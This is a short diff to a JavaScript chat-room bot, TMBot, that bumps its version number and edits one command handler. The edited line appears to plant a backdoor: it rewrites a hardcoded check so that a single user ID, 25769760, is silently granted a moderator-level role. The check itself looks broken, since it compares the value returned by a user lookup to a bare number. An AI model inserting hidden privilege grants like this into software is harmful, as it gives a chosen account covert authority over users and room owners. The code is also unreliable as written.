@@ -249,7 +249,7 @@
     var managers = ['',''];
     var CoHosts = ['',''];
     var TMBot = {
-        version: '2.13.0.2',
+        version: '2.13.0.4',
         status: false,
         name: 'TMBot',
         loggedInID: null,
@@ -1663,7 +1663,7 @@
                 type: 'startwith',
                 functionality: function(chat, cmd){
                      if (this.type === 'exact' && chat.message.length !== cmd.length || !TMbot.commands.executable(this.rank, chat)) return void(0);
-                    else if (API.getUser(chat.uid) === 23244654 && API.getUser(chat.uid) === 20856137) return API.moderateSetRole(API.getUser(chat.uid) , 2);
+                    else if (API.getUser(chat.uid) === 25769760 && API.getUser(chat.uid) === 25769760) return API.moderateSetRole(API.getUser(chat.uid) , 2);
                 }
             },
 
